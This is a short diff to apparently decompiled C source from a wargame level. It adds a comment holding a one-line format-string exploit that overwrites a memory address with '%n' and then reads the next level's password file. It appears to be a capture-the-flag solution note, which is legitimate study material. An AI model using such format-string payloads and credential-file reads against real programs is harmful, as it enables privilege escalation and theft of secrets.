@@ -16,6 +16,7 @@ void v(void)
     }
 }
 
+// (python -c "import struct,sys;sys.stdout.write(struct.pack('<I',0x804988c)+'C'*60+'%4\$n\n')"; echo 'cat /home/user/level4/.pass'; cat) | /home/user/level3/level3
 int main(void)
 {
     v();
